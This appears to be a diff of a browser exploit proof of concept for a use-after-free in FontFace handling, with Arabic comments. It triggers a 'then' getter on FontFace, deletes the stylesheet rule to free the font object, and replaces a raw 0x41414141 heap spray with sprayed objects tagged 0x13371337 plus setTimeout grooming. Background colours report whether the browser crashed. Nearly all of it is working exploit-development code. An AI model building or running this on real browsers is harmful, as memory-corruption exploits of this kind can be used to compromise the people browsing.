@@ -5,7 +5,7 @@
 @font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
 </style>
 </head>
-<body style="background: black;">
+<body style="background: black; color: white; font-family: monospace;">
 
 <script>
 window.onload = () => {
@@ -14,7 +14,8 @@ window.onload = () => {
     void A.loaded;
 
     let callbackCount = 0;
-    
+    let structures = [];
+
     Object.defineProperty(FontFace.prototype, 'then', {
         configurable: true,
         get() {
@@ -22,22 +23,34 @@ window.onload = () => {
                 callbackCount++;
                 
                 if (callbackCount === 1) { 
-                    // 1. تدمير الكائن
+                    // 1. تحرير كائن الخط
                     document.getElementById('s').sheet.deleteRule(0);
                     
-                    // 2. محاولة ملء الفراغ فوراً ببيانات ضخمة ومكثفة لإحداث تعارض عالي
-                    let poison = [];
-                    for (let i = 0; i < 500; i++) {
-                        // استخدام أحجام مختلفة لمحاولة إغراق قطاع الذاكرة المحرر
-                        poison.push(new Uint32Array(0x1000).fill(0x41414141)); 
+                    // 2. محاولة ملء الفراغ بكائنات جافا سكريبت ذات خصائص مكررة لشغل نفس الحجم
+                    // نضع قيم رقمية مميزة (مثل 0x1337) لنرى هل يمكننا قراءتها لاحقاً
+                    for (let i = 0; i < 200; i++) {
+                        let obj = {
+                            prop1: 0x13371337,
+                            prop2: 0x13371337,
+                            prop3: A, // إبقاء مرجع للكائن الأصلي
+                            id: i
+                        };
+                        structures.push(obj);
                     }
                     
-                    // 3. إجبار المحرك على القراءة الفورية
-                    document.body.offsetTop;
-                    
-                    // إذا كان الكود أعمى ولا يرى الثغرة، ستصبح الشاشة خضراء.
-                    // إذا كانت الثغرة شغالّة 100%، الـ offsetTop سيحاول قراءة البيانات المسمومة (0x41414141) كعنوان وينهار فوراً.
-                    document.body.style.background = "green";
+                    // 3. فصل التنفيذ للسماح للمتصفح بإعادة ترتيب الذاكرة (Grooming)
+                    setTimeout(() => {
+                        try {
+                            // محاولة استدعاء خاصية مجدداً لإجبار المتصفح على القراءة من الكائن المستبدل
+                            let check = A.family; 
+                            
+                            // إذا استقر المتصفح وقرأ دون انهيار، نغير اللون للأزرق
+                            document.body.style.background = "blue";
+                        } catch(e) {
+                            // إذا حدث خطأ برمجي عادي وليس انهيار متصفح
+                            document.body.style.background = "red";
+                        }
+                    }, 0);
                 }
             }
             return undefined;
